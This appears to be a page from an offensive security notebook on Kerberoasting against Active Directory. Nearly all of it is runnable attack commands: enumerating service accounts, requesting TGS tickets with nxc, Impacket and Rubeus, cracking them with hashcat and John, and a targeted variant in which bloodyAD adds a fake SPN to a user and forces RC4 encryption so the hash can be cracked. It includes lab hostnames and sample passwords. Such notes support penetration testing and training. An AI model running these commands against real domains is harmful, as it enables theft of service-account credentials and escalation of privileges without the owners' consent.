---
description: >-
  The goal of Kerberoasting is to harvest TGS tickets for services that run on
  behalf of user accounts in the AD, not computer accounts.
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/kerberos-attack/kerberoasting
---

# Kerberoasting

## Discovery Kerberos Account

{% code overflow="wrap" %}
```bash
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
# ADSearch
ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# Setspn
PS C:\> setspn -T vulnableone.local -Q */*

# PowerView
Get-DomainUser -SPN | select serviceprincipalname
Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation

# Invoke-Kerberoast
Import-Module .\PowerView.ps1
Invoke-Kerberoast

# AD-Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
{% endcode %}

## Kerberoasting via AS-REP Roasting

{% code overflow="wrap" %}
```bash
nxc ldap 192.168.0.104 -u harry -p '' --no-preauth-targets kerberoastable.list --kerberoasting output.txt
```
{% endcode %}

## Impacket

```python
impacket-GetUserSPNs vulnableone.local/svc:Passvord123 -dc-ip 10.10.10.10 -request
```

### Rubeus

```powershell
Rubeus.exe kerberoast /simple /nowrap
Rubeus.exe kerberoast /user:svc /nowrap
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /rc4opsec /outfile:C:\Users\khan.chanthou\Desktop\hashes.txt
Rubeus.exe kerberoast /rc4opsec /domain:vulnableone.local /outfile:C:\Users\khan.chanthou\Desktop\hashes.txt
```

Note : The `/tgtdeleg` flag can be useful for us in situations where we find accounts with the options `This account supports Kerberos AES 128-bit encryption` or `This account supports Kerberos AES 256-bit encryption` set, meaning that when we perform a Kerberoast attack, we will get a `AES-128 (type 17)` or `AES-256 (type 18)` TGS tickets back which can be significantly more difficult to crack than `RC4 (type 23)` tickets. We will know the difference because an RC4 encrypted ticket will return a hash that starts with the `$krb5tgs$23$*` prefix, while AES encrypted tickets will give us a hash that begins with `$krb5tgs$18$*`.

## Crack Hash

### Hashcat

```bash
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlist/rockyou.txt
```

### John

```bash
kirb2j0hn ticket.kirbi > crackfile
john --format=krb5tgs crackfile --wordlist=10k-worst-pass.txt
```

### Crack with kerberos tool

{% code overflow="wrap" %}
```python
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-svc@HTTP~WEB.vulnableone.local-VULNABLEONE.LOCAL.kirbi
```
{% endcode %}

### Kerberos Service Ticket

We can configure a Service Principal Name for the Target User

{% code overflow="wrap" %}
```bash
bloodyAD --host dc01.hack.htb -d hack.htb -u 'alex.john' -p 'Checkpoint2024!' set object mark.davies servicePrincipalName -v 'fake/markdavies.hack.htb'
```
{% endcode %}

{% code overflow="wrap" %}
```bash
GetUserSPNs.py -dc-ip 10.129.15.xx -request-user mark.davies 'checkpoint.htb/alex.turner:Checkpoint2024!'
```
{% endcode %}

The $krb5tgs$18$ hash uses AES encryption, which is too strong to crack efficiently. We need to set SupportedEncryptionTypes to 4 (RC4) and request a new TGS ticket

<figure><img src="../../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
##We Force RC4 Encryption for the Target User (Write ACL Needed)
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb \
    -u 'alex.turner' -p 'Checkpoint2024!' \
    set object mark.davies msDS-SupportedEncryptionTypes -v 4
```
{% endcode %}
